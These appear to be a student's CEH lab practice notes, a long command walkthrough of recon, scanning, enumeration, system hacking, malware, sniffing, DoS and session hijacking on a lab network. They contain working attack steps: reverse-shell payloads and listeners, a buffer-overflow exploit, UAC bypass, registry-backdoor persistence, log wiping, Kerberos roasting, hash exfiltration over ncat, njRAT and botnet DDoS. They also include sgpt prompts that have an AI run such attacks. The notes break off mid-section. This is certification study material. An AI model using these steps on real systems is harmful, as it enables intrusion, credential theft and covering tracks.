# CEH-practice-notes
# Reconnasiance/Footprinting
<details>
  <summary>To find the subdomain</summary>

* nmap to find subdomain
```console
:~$ nmap -p 53 --script dns-brute <domain>
``` 
* google
```console
  :~$ site:example.com -inurl:www
```
* sublist3r
```console
  :~$ sublist3r -d example.com -o sublist3r_subs.txt
```
* some research websites
```console
  :~$ netcraft
      DNS dumpster
      pentest-tools.com
      SHODAN
```
* Collects open-source intelligence (OSINT) about domains, IPs, hosts, and people
```console
  :~$ recon-ng
  ```  
</details>

<details>

  <summary>social media recon by using sherlock</summary>

* sherlock
```console
:~$ sherlock "user name"
```
</details>

<details>

 <summary>Whois lookup</summary>

 * domaintools 
 (gives info regard a owner ph no and email)
 ```console
:~$ https://whois.domaintools.com
```

* nslookup(DNS lookup) <#windows>
```console
:~$nslookup
set type = a
( a >> configures nslookup to query for the IP address of a given domain.)
(shows non authorative result but we need authorative name so)

set type=cname
cnmae >>  lookup is done directly against the domain's authoritative name server 

set type=a
and get the name server ip

```
* nslookup website
```console
:~$ http://www.kloth.net/services/nslookup.php
```
</details>

<details>

 <summary>to trace a email</summary>

* Email tracker pro
```console
:~$ Install email tracker pro from the directory of a lab 
    and copy down the email header you want to track
```

</details>


<details>

 <summary>network footprinting</summary>

* tracert<#windows> traceroute<#linux>(helps in mapping the nw hosts)
```console
:~$ tracert www.target.com
tracert /? (help)
tracert -h 5 www.target.com
(-h > number of hopes)
```
* traceroute(linux)
```console
:~$ traceroute www.targetdomain.com
(to check ip)whois [ip]
```
</details>

<details>
<summary>recon-ng</summary>

* recon-ng 
```console
:~$recon-ng
   help
   marketplace install all

  (then to create workspace)
  workspace create CEH
  wrokspace list
  ```
  * To add the domain to workspaces
  ```console
  :~$ (help  for options)
  db insert domains(take you to the workspace interface)
  1.certifiedhacker.com
  2.hit enter
  show domains
  ```
* To search and load modules
```console
:~$ modules load brute (to get host related to target domain)
  modules load (desired modules for brute)
  run
  back

  modules load reverse_resolve
  modules load(desired module)
  show hosts(shows all hosts which is harvested)
```
* then to reporting
```console
:~$ modules load reporting
  modules load reporting/html
  options list(list options)
  options set FILENAME
              CUSTOMERNAME
              CREATOR
```
* then to get the contact of the domain
```console
:~$ modules load whois_pocs
  command info(to see a module interface,to set data)
  options set SOURCE facebook.com
  run

```
* to extract subdomains and IP
```console
:~$ module load recon/domains-hosts/hackertarget
options list
options set SOURCE certifiedhacker.com
run
```
</details>

<details>
<summary>recon by AI</summary>

* reconniassance with AI
```console
:~$sgpt --chat recon --shell "t organization. To do so, run sgpt --chat footprint --shell "Use theHarvester to gather email accounts associated with 'microsoft.com', limiting results to 200, and leveraging 'baidu' as a data source"
```
</details>

<details>
<summary>BillCipher</summary>

* Use this tool to get passive info of many details of org
```console
:~$sudo apt update && sudo apt install ruby python python-pip python3 python3-pip
sudo apt install httrack whatweb
git clone https://github.com/GitHackTools/BillCipher
cd BillCipher
pip install -r requirements.txt
pip3 install -r requirements.txt
python3 billcipher.py
```
</details>







# Scanning Networks
<details>
<summary>Host discovery</summary>

* Host discovery by
ARP ping scan
UDP ping scan
ICMP ping scan (ICMP ECHO ping, ICMP timestamp, ping ICMP, and address mask ping)
TCP ping scan (TCP SYN ping and TCP ACK ping)
IP protocol ping scan

```console
:~$ nmap -sn -PR [target ip]

-sn>>no port scan
-PR>>arp ping scan
```
* UDP ping scan
```console
:~$ nmap -sn -PU [target IP]
-PU>>UDP scan
```
* ICMP echo ping scan
```console
:~$ nmap -sn -PE [IP address]
PE>>ICMP echo ping scan
```
* ICMP ping sweep 
``` console
:~$ nmap -sn -PE [Range of IP address]
```
* ICMP timestamp ping scan
```console
:~$ nmap -sn -PP [IP address]
-PP>>timestamp ping scan
```
* Other scanning technique
```console
:~$nmap -sn -PM [ip address]
PM>>ICMP address mask ping scan

#########################################
nmap -sn -PS [target ip]
PS>>TCP SYN Ping Scan
#########################################
nmap -sn -PA [target ip]
-PA>>TCP ACK Ping Scan
########################################
nmap -sn -PO [ip address]
-PO>>IP Protocol Ping Scan(sends every protocols and send back the response)
```
</details>
<details>

<summary>Port and service discovery</summary>

* here using zenmap
```console
:~$ nmap -sT -v [target ip]
-sT>>TCP connect/full open scan
-v>>verbose
```
* To scan firewall enabled machine(bypass firewall)
```console
:~$nmap -sS -v [ip address]
-sS>>stealth scan
```
* xmass scan (sends urg psh fin)
```console
:~$nmap -sX -v [ip address]
-sX>>xmas scan
```
* maimon scan (ack+fin)
```console
:~$ nmap -sM -v [ip address]
-sM>>maimon scan
```
* by ACk flag
```console
:~$ nmap -sA -v [ip address]
-sA>>ack probe scan
```
* UDP scan (firewall is off)
```console
:~$nmap -sU -v [ip address]
-sU>>UDP scan
```
* other port and application scanning meathods
```console
:~$nmap -sI -v [target IP address]
-sI>>IDLE/IPID Header Scan
#############################
nmap -sY -v [target IP address]
-sY>>SCTP init scan
#############################
nmap -sZ -v [target IP address]
-sZ>>SCTP COOKIE ECHO Scan
```
</details>
<details>
<summary>Version scan/agressive scan</summary>

* version
```console
:~$nmap -sV [ip address]
-sV>>version scan
##############################
nmap -A 10.10.1.* (* do all subnet scan)
-A>>agressive scan
(performs -sV -O -sC(script scanning) --traceroute)
```
</details>
<details>
<summary>OS discovery</summary>

* os discovery using nmap script engine(NSE)>>using -O -A NSE
```console
:~$nmap --script smb-os-discovery.nse [ip address]
```
</details>

<details>
<summary>Scan beyond the IDS & firewll</summary>

* By fragmenting the packet

```console
:~$ nmap -f [ip address]
-f>>fragment

```
* Source port manipulation
```console
:~$ nmap -g 80 [ip address]
-g ,--source-port >> source port manipulation
```
* MTU(maximum transmission unit)
```console
:~$ nmap -mtu 8 [ip adress]
-mtu>>maximum transmision unit(which is send smaller data packets 8 bytes)
```
* Decoy(random ip adress)
```console
:~$ nmap -D RND:10 [ip address]
-D>>decoy
RND>>random ip count
```
* MAC spoofing
```console
:~$ nmap -sT -Pn --spoof-mac 0 [ip address]
-sT>>TCP full scan
-Pn>>no host discovery
--spoof-mac 0>>gives legitimate mac address in the network
```
</details>
<details>
<summary>Scan a target network using metasploit</summary>
```console
:~$ open the msfconsole
nmap -sP -sS -A -oX test [ip/24](subnetmask)
-oX>>output to xmp file names test
```

* by metasploit madules
```console
:~$ search port scan (shows all module related to port scan)
use auxilary/scanner/portscan/syn
show options and set values
run
###############################
same scanned for TCP (same module with tcp at last)
set target ip(RHOSTS)

#found 445 open port so scanning smb version
use auxilary/scanner/smb/smb_version 
set RHOSTS [ip range]
threads 11

```
</details>
<details>
<summary>Scanning network using sgpt</summary>

```console
:~$ sgpt --chat scan --shell "prompt (by using HPING3")
```

</details>





# Enumeration
<details>
<summary>Netbios enumeration</summary>

* nbtstat

```console
:~$ nbtstat -a [ip address]
-a>>displays the NetBIOS name table of a remote computer.



nbtstat -c 
-c>> displays the cashe of netbios



net use
>>shows active connection
```

</details>

<details>

<summary>SNMP enumeration using tools</summary>

* SnmpWalk]
```console
:~$ snmpwalk -v1 -c public <Ip address>
-v1>>version of snmp
-c>>community string(public/private)

#for v2 snmp

snmpwalk -v2c -c public <ipaddress>
-v2c>>version
```
</details>

<details>
<summary>LDAP enumaration</summary>

* By using AD explorer
```console
:~$open exe file in explorer
```
</details>
<details>
<summary>NFS enumeration</summary>

* by using nmap
```console
:~$ nmap -p 2049 [ip addr] 
-p>> to specify port

to check target is NFS is enabled or not
(to enable it in target device use server manager)


than open super enum tool 
create a file included target ip as Target.txt
#echo "target ip" >> target.txt
 next

./superenum

(If you get an error running the ./superenum script, execute chmod +x superenum command, then repeat Step#13.)
```

* by RPCScan
```console
:~$ cd RPCScan
python3 rpc-scan.py [Target IP address] --rpc
--rpc>> lists the RPC (portmapper)
```
</details>
<details>
<summary>DNS enumeration using zone transfer</summary>

* By using dig command
```console
:~$ dig ns [target domain]
ns>>shows the name server
```
* To check it has zone transfer or not
```console
:~$ dig @ [name server] [target domain] axfr
axfr >> retrives zone transfer info
```
* By using nslookup
```console
:~$ nslookup
set querytype=soa

soa>>sets the query type to SOA (Start of Authority) record to retrieve administrative information about the DNS zone of the target domain certifiedhacker.com.

then in interactive mode

ls -d [name server]
## this command checks is domain supoort zone tarnsfer or not
```
</details>

<details>
<summary>SMTP enumeration</summary>

* Usimg nmap
```console
:~$ nmap -p 25 --script=smtp-enum-users [ip]
##shows all the mail users
## to check the script >> nmap --script-help 'http-*' | less


nmap -p 25 --script=smtp-open-relay [target IP]    

```
</details>

# Vulnerability Analysis
<details>

<summary>Research on CWE (common weakness enumeration)</summary>

* Research CWE website
```console
:~$ cwe.mitre.org
aslo can check access content >> cwe list
```
</details>
<details>
<summary>OpenVAS</summary>

* Vulnerability analysis using OpenVAS
```console
:~$ to open OPENVAS 
parrot cmd >> 
docker run -d -p 443:443 --name openvas mikesplain/openvas
then http://127.0.0.1
passward:admin admin
```
</details>
<details>
<summary>Using AI </summary>

* Perform Vulnerability Analysis using AI
```console
:~$ sgpt --chat nikto --shell "Scan the URL https://www.certifiedhacker.com to identify potential vulnerabilities with nikto"


 sgpt --chat vuln --shell "Perform vulnerability scan on target url http://www.moviescope.com with Nmap with port 80"

 ```

 ## by using skipfish (website)
 ```console
 :~$ sgpt --chat vuln --shell "Perform a vulnerability scan on target url http://testphp.vulnweb.com with skipfish" 
 open the saved html file with browser
 ```

</details>

# System Hacking
<details>

<summary>Crack the password using responder</summary>

* cmd to run responder
```console
~$:sudo responder -I eth0
-I>>interface

in target system run bar \\CEH-Tools
and in parrot copy the capture hash availed in responder
and in another sudo terminal
pluma hash.txt n copy it here
```
//then decript using john
```console
~$:john hash.txt
```
</details>
<details>
<summary>Access remote system using Reverse shell generator</summary>

* Enable reverse shell
```console
~$:docker run -d -p 80:80 reverse_shell_generator
```
* firefox >> http://localhost
```console
~$:In the IP field, type [attacker sys ip] as listener IP and in the Port field, type 4444 as listener port.

and copy the msfvenom cmd in the same window and paste it in cmd (windows meterpreter reverse TCP)

We will start a listener using Reverse Shell Generator, to do so, switch to the browser window and select msfconsole as Type from the drop-down under Listener.
and copy the code >> paste it in cmd >> listner will start

In attacker system go to file (ctrl L) and type smb://10.10.1.11 to get win 11 files 
Navigate to CEHv13 Module 06 System Hacking and paste the copied reverse.exe file.

in victm machine navigate to CEH tool and copy the reverse.exe and copy it to desktop
double click it (exe)

```

* After session created
```console
~$: getuid (to get the user details)
```

* Now by powershell script
```console
~$: in firefox reverse shell page select PowerShell IEX and change port to 444 and copy the code

and in new su cmd 
pluma shell.ps1 and copy the code and save

and now we have to create a hoaxshell listner for that
back to reverseshell browser window and input 444 as port and select hoaxshell
copy paste it in cmd and enter


now copy the shell file wee created and paste it in wind 11 cehtool folder by smb://10.10.1.11
in winn 11 navigate to this file and paste it in win 11 desktop
```

* open powershell as a admin
then type
```console
~$: cd C:\Users\Admin\Desktop
and run .\"filename"
>>to run a file in victim machine
```
</details>
<details>
<summary>Perform Buffer Overflow Attack to Gain Access to a Remote System</summary>

* download vulnserver from module6 file and run
* and also install immunity debugger and run it as admin
```console
~$:click file in the menu bar
and click attach n attach the vulnserver
then run it (play button at top)
```
* shift to parrot
```console
~$:nc -nv 10.10.1.11 9999
-n >> dont try to resolve hostname with dns, use the ip exactly as given

type HELP
```
* Generate spike template and performing spiking
//to create a spike template on STATS function
```console

~$: pluma stats.spk and type the following cmd

s_readline();

s_string("STATS ");

s_string_variable("0");
```
* to send the package to vulberable server
```console
~$: generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
here STATS fn is not vulnerable to bufferoverflow
```
* so we will perform TRUN function
```console
~$:pluma trun.spk
and type
s_readline();

s_string("TRUN ");

s_string_variable("0");
```
* run
```console
~$: generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
```
* Now performing FUZZING
```console
~$:navigate to ceh tools and buffer over flow file copy script file and paste it in desktop
now perform python script to perform fuzzing

navigate to cd /home/attacker/Desktop/Scripts/
```
execute
```console
~$:chmod +x fuzz.py
./fuzz.py
```
* pattern create by ruby tool (in a same script file)
```console
~$:in linux cmd >> /usr/share/metasploit-framework/tools/exploit/pattern_crteate.rb -l 1040
-l>>leangth of a byte size

>>it creates some random piece of bytes
copy the characters
>>
paste it in
 pluma findoff.py (script file)
>>in bw offset ""

chmod +x findoff.py
./findoff.py
and open immunity debugger and notedown the EIP (offset value)
```
then
```console
~$: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q (offset value)
-q>>offset value
then close the cmd window
resrart the immunity devbugger and vuln server
```
then (in script file)
```console
~$: chmod +x overwrite.py
./overwrite.py
>> to overwrite EIP
```
* by bad chars
```console
~$: chmod +x badchars.py (in script folder)
./badchars.py

>> in immunity debugger click on ESP and follow in dump option
```
* Now we have to identify the right module of the vulnerable server (mona.py)
```console
~$: navigate to E:\CEH-Tools\CEHv13 Module 06 System Hacking\Buffer Overflow Tools\Scripts, copy the mona.py script, and paste it in the location in windows 11 C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
```
nxt open immunity debugger
and type !mona modules in txt field of immunity debugger
observe that essfunc.dll have no memory protection

```console
~$: in unix cmd 
python3 /home/attacker/converter.py
Enter the assembly code here : prompt appears; type JMP ESP and press Enter.

here ffe4

In the Immunity Debugger window, type !mona find -s "\xff\xe4" -m essfunc.dll and press Enter in the text field present at the bottom of the window.

the address of vulnerable module you will found in first result


 Immunity Debugger window, click the Go to address in Disassembler icon (the arrow towards right)
in pop enter the address of vulnerable module (625011af)
run debugger

and in script file
chmod +x jump.py
./jump.py
>> which over right the EIP
```
* then to generate a shell code
```console
~$: msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00"

>>Here, -p: payload, local IP address: 10.10.1.13, listening port: 4444, -f: filetype, -a: architecture, -b: bad character.

copy the granted shellcode
and paste it in
pluma shellcode.py
add b in every line to convert string to bytes
```
then before running the command we have to create a listner by netcat
```console
~$: nc -nvlp 4444
and in script folder path
chmod +x shellcode.py
./shellcode.py
```
</details>
<details>

## Perform Privilege Escalation to Gain Higher Privileges 
<summary>Escalate privileges by bypassing UAC and exploiting Sticky Keys</summary>

* create a payload
```console
~$: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe.

```
* create a folder in localhost in var directory
```console
~$: var >> mkdir share
Run chmod -R 755 /var/www/html/share command
Run chown -R www-data:www-data /var/www/html/share command
```
* Copy the payload into the shared folder by executing
```console
~$:cp /home/attacker/Desktop/Windows.exe /var/www/html/share/


Start the Apache server by executing service apache2 start command.
```
* Run metasploit
```console
~$: msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST<>
set LPORT <>


run the payload in victim machine
```
* now we will bypass the UAC by "FodHelper"
```console
~$:use exploit/windows/local/bypassuac_fodhelper
set session 1
set TARGET = 0
exploit
```

```console
~$: getsystem -t 1 and press Enter to elevate privileges.
```
* now using sticky keys module
```console
~$: post/windows/manage/sticky_keys
set session 2
exploit
proceed to mark user account and in lock screen hit sticky key 5 times 
whoami
```
</details>
<details>
<summary>Maintain Remote Access and Hide Malicious Activities</summary>

* User System Monitoring and Surveillance using Spyrix
```console
~$:Spyrix (GUI)
```
<summary> Maintain Persistence by Modifying Registry Run Keys</summary>

* create a payload
```console
~$: msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe
```
>payload that needs to be uploaded into the Run Registry of Windows 11
```console
~$:msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe

cp /home/attacker/Desktop/Test.exe /var/www/html/share/ and cp /home/attacker/Desktop/registry.exe /var/www/html/share/

start the apache2
```
>run metasploit
```console
~$: msfconsole
set payload windows/meterpreter/reverse_tcp
set lhost and lport
```
* Windows UAC protection evading
```console
~$: Windows UAC protection via SilentCleanup task present in Windows Task Scheduler. It is present in Metasploit as a bypassuac_silentcleanup exploit.

use exploit/windows/local/bypassuac_silentcleanup
set session 1
set TARGET 0
exploit
getsystem -t 1 (escalate previlage)
```
>to ingect malicious file
```console
~$:reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"

msfconsole in another cmd
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set lport and lhost the same which is given to registry payload
 restart the victim machine
 ```
 </details>
 <details>
 <summary>Clear Logs to Hide the Evidence</summary>
 
 * Clear Windows Machine Logs using Various Utilities
 ```console
~$:download from file >> Clear_Event_Viewer_Logs.bat.
runs automatically and closes it cleares all trackes
```
> manually clearing logs through cmd
```console
~$:run cmd with administrater privilage and run
wevtutil el (shows all logs)
to clear system logs
wevtutil cl system (cl >> clear log)
```
> To hide the deleted file that auditor not to recover
```console
~$ cipher /w:[Drive or Folder or File Location]
cipher /w:c
>>it over writes the deleted file
```
* Clear Linux Machine Logs using the BASH Shell
```console
~$:export HISTSIZE=0 
>>command to disable the BASH shell from saving the history.
>>HISTSIZE: determines the number of commands to be saved, which will be set to 0.

```
```console
~$: history -c
clears the earlier used commands

history -w 
>> to delete the stored bash cmd 

shred ~/.bash_history
>>it will destroy the history

more ~/.bash_history
>> to view the shredded history
```
>we can perform all this bash clear in one single code
```console
~$shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit.
```
</details>
<details>
<summary>Perform Active Directory (AD) Attacks</summary>

* Perform Initial Scans to Obtain Domain Controller IP and Domain Name
```console
~$ nmap 10.10.1.0/24
>>to scan entire subnet and to find domain controller ip 
>>analyse the result that which ip having the LDAP 389/TCP and Kerberos 88/TCP port open that is over DC
```
```console
~$: Now scanning 10.10.1.22 / DC machine in more depth
nmap -A -sC -sV 10.10.1.22
-A >> Agressisve
_sC >> script (nmap script engine)
-sV >> Version/service detection
after this scan we can see domain name here its CEH.com
```
* Perform AS-REP Roasting Attack (to check which user dont enable DONT_REQUIRE_PREAUTH in DC)
```console
~$:cd to move into root
cd impacket/examples/ 
>> to get inside the directory
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.

>>GetNPUsers.py: Python script to retrieve AD user information.

>>CEH.com/: Target AD domain.

>>-no-pass: Flag to find user accounts not requiring pre-authentication.

>>-usersfile ~/ADtools/users.txt: Path to the file with the user account list.

>>-dc-ip 10.10.1.22: IP address of the DC to query.

here we found user johua have this "DONT_REQUIRE_PREAUTH"
```
```console
~$: copy the [hash]
and
echo '[HASH]' > joshuahash.txt. 
to store hashes inside the text file
```
>then crack the password
```console
~$:  john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt.
```
</details>
<details>
<summary>Spray Cracked Password into Network using CrackMapExec</summary>

* CrackMapExec (with nmap scanned services like ldap rdp ftp etc)
```console
~$:here we are taking rdp (remote desktop protocol)
 cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"

>>rdp: Targets the Remote Desktop Protocol (RDP) service.

>>10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.

>>-u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication.

>>-p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts. 
found here mark is pewned
```
```console
~$: Remmina 
>>after the above step of CME (getting of user and password)
>>open Remmina in search bar in parrot os
```
</details>
<details>
<summary>Perform Post-Enumeration using PowerView</summary>

* Powerview
```console
~$:open Remmina with credential opt from password spray technique 
open powershell
cd Downloads 
Powershell -EP Bypass
. .\PowerView.ps1
Get-NetComputer (shows computer object)
Get-NetGroup (list all the grooup)
Get-NetUser (details of user account)
during this enumeration
we found new user >> SQL_srv
```
```console
~$: listed commands that you can use with PowerView.ps1 for enumeration:

Get-NetOU - Lists all organizational units (OUs) in the domain.
Get-NetSession - Lists active sessions on the domain.
Get-NetLoggedon - Lists users currently logged on to machines.
Get-NetProcess - Lists processes running on domain machines.
Get-NetService - Lists services on domain machines.
Get-NetDomainTrust - Lists domain trust relationships.
Get-ObjectACL - Retrieves ACLs for a specified object.
Find-InterestingDomainAcl - Finds interesting ACLs in the domain.
Get-NetSPN - Lists service principal names (SPNs) in the domain.
Invoke-ShareFinder - Finds shared folders in the domain.
Invoke-UserHunter - Finds where domain admins are logged in.
Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines.
```
</details>
<details>
<summary>Perform Attack on MSSQL service</summary>

* xp_cmdshell is a SQL server stored procedure enabling command shell execution. (allows to interact with system which connected to the sql)
```console
~$: during nmap scan we observed that host 10.10.1.30 port 1433 is opened (sql port)
as we got the user name through powerview.ps1 enumeration now we have to find the password so we are using
```
>>Hydra
```console
~$: store SQL_srv in text file
pluma SQL_srv > user.txt
hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
>>
Next, we will attempt to log into the service using mssqlclient.py.
the data base name is master here
```
```console
~$: and execute
 SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';,
it returns a value one so that we know xp_cmdshell is enables
```
>>next open msfconsole
```console
~$: use exploit/windows/mssql/mssql_payload
set RHOST 10.10.1.30
set USERNAME SQL_srv
set PASSWORD batman
set DATABASE master


>>next
type shell (to interact with shell cmd with system)
whoami (to confirm the username)
```
<summary>Perform Privilege Escalation</summary>

* WinPEASx64.exe (tool for privilage escalation)
```console
~$: to perform a higher attack we need a higher previlage so
we are going to run WinPEASx64.exe in victim machine
in meterpreter
Move to C:\ using the command cd C:\.cd \Users\Public\Downloads
type powershell

>> we need to host winPEASx64.exe 
open new cmd as root
and type
 cd /root/ADtools
 python3 -m http.server and press Enter to host the winPEASx64.exe file
 >> again open shell terminal (parrot)
 wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.

 execute
  ./winpeas.exe.
  >> observe the output. Here, we have a file named file.exe in C:\Program Files\CEH Services that is unquoted and can be exploited for privilege escalation. (in autorun application section)
  ```
  ```console
  ~$: in new terminal (parrot)
  msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
  get back to shell cmd
  cd ../../.. ; cd "Program Files/CEH Services".
  >>
  move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe.
  ```
  >>netcat
  ```console
  ~$: nc -nvlp 8888 
  open victim machine win 2019 (ad)
  and login with user name SQL_srv n pass batman
  and back to nc cmd
  here it listend and 
  whoami
  ```
  </details>
  <details>
  <summary>Perform Kerberoasting Attack</summary>

  * Rubeus (tool)
  ```console
~$:powershell 
 >>in netcat cmd to get into the powershell
 navigate to downloads
 >>
 Now, we will be downloading Rubeus and netcat. Execute the command wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe. Once the tools are downloaded type exit and press Enter.
 >>
 cd ../.. && cd Users\Public\Downloads and press Enter to move into the Downloads folder.
 ```
 ```console
 ~$: execute the command
 rubeus.exe kerberoast /outfile:hash.txt.

 >> to send this hash file to attacker system we using netcat
 open new terminal
 nc -lvp 9999 > hash.txt 

 In the shell terminal, execute the command
  ncat.exe -w 3 10.10.1.13 9999 < hash.txt.
  get back to netcat cmd and press enter to save the file
  ```
  >>offline crack of hach by using Hashcat
  ```console
  ~$:  hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
  advances! is a got password
  ```
  </details>
  <details>
  <summary>Hacking system using AI</summary>

  ```console
  ~$: to create payload
  sgpt --shell "Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=444"
  >>to start listner
  sgpt --shell "Use msfconsole to start a listener with lhost=10.10.1.13 and lport=444" 
  >>to crack password by Hydra
  sgpt --shell "Use Hydra to perform SSH-bruteforce on IP address=10.10.1.9 using username.txt and password.txt files available at location /home/attacker/Wordlist"
  >>to dp stegonography
  sgpt --shell "Perform stegnography using steghide to hide text 'My swiss account number is 232343435211113' in cover.jpg image file with password as '1234'"
  >>to extract the hidden text
  sgpt --shell "Use steghide to extract hidden text in cover.jpg"
  ```
  </details>

  # Malware Threat
  <details>
  <summary>Gain control over a victim machine using the njRAT RAT Trojan</summary>

  * install the application

 ```console
  :~$from ceh tools
  njRAT v0.8d.exe.
  >>
  then in GUI click build button
  check the options Randomize Stub, USB Spread Nj8d, Protect Prosess [BSOD], 
  and put ip of attacker machine and hit build
  send via share folder to target
  double click
  and back to attacker system
  right click on session and file manager
  you will get all option once the session starts

```

</details>

<details>

<summary>Infect the Target System using a Virus</summary>

* JPS Virus Maker Tool
```console
:~$ install JPS virus from ceh tools
enable the required check box
and hit right side arrow to get more option
```
</details>

<details>
<summary>Perform Static Malware Analysis</summary>

* Perform Malware Scanning using Hybrid Analysis
```console
:~$go to https://www.hybrid-analysis.com
upload the given malware file
```
*  Analyze ELF Executable File using Detect It Easy (DIE)
```console
:~$ navigate in ceh tool and install DIE
3 dot in right corner and add file 
```
* Perform Malware Disassembly using IDA and OllyDbg
```console
:~$install IDA exe
and navigate throught the options to get specific data
```
>> by OllyDbg
```console
:~$install it and go throw options
```
</details>
<details>
<summary>Perform Dynamic Malware Analysis</summary>

*  Perform Port Monitoring using TCPView and CurrPorts
```console
:~$ send trojan to victim by using njrat
and go to victim machine n instal TCPview 
```
>> now through currports
```console
:~$install currports and click on exe and properties to see details
```
</details>

# Sniffing
<details>

<summary>Perform Active Sniffing</summary>

* Perform MAC Flooding using macof
```console
:~$open wireshark
open new terminal and cd to root

macof -i eth0 -n 10
-i> interface
-n > number of packets

for single target
macof -i eth0 -d [Target IP Address] 
-d>target destination
```
* Perform a DHCP Starvation Attack using Yersinia
```console
:~$ yersinia -I 
-I>interactive session
press any key in session and press h to get help cmd
press F2 to go DHCP session
x to get available attack option
q to stop yersinia
```
</details>
<details>
<summary>Perform Network Sniffing using Various Sniffing Tools</summary>

* Perform password sniffing using Wireshark
```console
:~$ open any browser and
http://www.moviescope.com/
login
and back to attacker system
in wireshark
save the captured packet
filter :http.request.method == POST
navigate to Edit --> Find Packet

Click Display filter, select String from the drop-down options, click Narrow & Wide and select Narrow (UTF-8 / ASCII) from the drop-down options and click Packet list, select Packet details from the drop-down options.

In the field next to String, type pwd and click the Find button.

to sniff remotely in wireshark
use remote desktop option and enable  Remote Packet Capture Protocol v.0 and close the remote window and come back to wireshark (attacker machine)

here navigate to capture option
and click manage interface
remote interface
and + icon
add the system
```
</details>
<details>
<summary>Detect Network Sniffing</summary>

* Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network
```console
:~$open cain in search bar (attacker system)
configure ethernet card
 Ensure that the Adapter associated with the IP address 
 and then click Start/Stop Sniffer

Click the plus (+) icon or right-click in the window and select Scan MAC Addresses to scan the network for hosts.
MAC Address Scanner window appears. Check the All hosts in my subnet radio button. Select the All Tests
Now, click the APR tab at the bottom of the window.
and press + icon
here select the 2 system to capture the packet bw them
Click on the Start/Stop APR
To generate traffic between the machines,
go to parrot and 

hping3 {target ip address} -c 100000
-c>count
come back to cain opened system and open
wireshark
click Edit in the menu bar and select Preferences….
 expand the Protocols node.
 Detect ARP request storms checkbox and ensure that the Detect duplicate IP address configuration checkbox is checked; click OK.
click on ethernet interface to start capture the packet
stop the capture 
Click Analyze from the menu bar and select Expert Information
```
>> to detect promiscous mode
```console
:~$ nmap --script=sniffer-detect {target ip address/range}
```
</details>

<details>
<summary>Social engineering</summary>

* Sniff Credentials using the Social-Engineer Toolkit (SET)
```console
:~$setoolkit 
to lounch SET
navigate to site clone
and clone the prefered site 
and send it to victim by sending the host ip 
```
</details>
<details>
<summary>Detect phishing using Netcraft</summary>

* Netcraft
```console
:~$netcraft extension to detect phishishing site
```
</details>

# Perform DoS and DDoS Attacks using Various Techniques
<details>
<summary>Perform a DDoS Attack using ISB and UltraDDOS-v2</summary>

* ISB (I am so bored)
```console
:~$open and install ISB exe from ceh tools and give the credentials
```

> same open on the other system and open UltraDDOS-v2 add credential here
```console 
:~$and proceed to victim machine and open resmon(resource monitor)
check cpu usage
```
*  Perform a DDoS Attack using Botnet
```console
:~$ in parrot
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe
and same cmd to create 2 more payload by changing port number
create a folder

Run mkdir /var/www/html/share command to create a shared folder
Run chmod -R 755 /var/www/html/share/ command
Run chown -R www-data:www-data /var/www/html/share/ command

cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
service apache2 start 

Launch three new terminals

msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
same command in all 3 terminal by changing port numbers

and then
http://10.10.1.13/share << in victim machine and download and click
Similarly, download exploit2.exe on Windows Server 2019, and exploit3.exe on Windows Server 2022 and run it.

Now, we will upload the DDoS script to our botnets

upload /home/attacker/Downloads/eagle-dos.py
for all 3 terminal shell cmd
shell (cmd to get in shell)

then to see the impact go to ubuntu and hit wireshark afterwords
show application and navigate to system monitor and observe the memory usage
```
</details>
<details>
<summary>Detect and protect against DDoS attacks using Anti DDoS Guardian</summary>

```console
:~$ open anti ddos guardian tool in defender system and 
perform ddos attack with low ion cannon
and also in another system use UDP and thread option and Ip and attack the defend system

in guardian you can block the ip from the option
```
</details>

# Session Hijacking
<details>


<summary>Hijack a session using Caido</summary>

* Caido

```console
:~$open cmd prompt as admin
ipconfig/flushdns
search for c caido in search bar

Caido application window appears, click on menu besides Start button and select Edit.
click on the radio button besides All interfaces (0.0.0.0) and click save
and start
 + Create a project button to create a new project. Create a project pop-up appears, name it as Session Hijacking and click Create.
 Click on Intercept option on the left pane
  Forwarding icon and wait until it changes to Queuing
  ```
  ```console

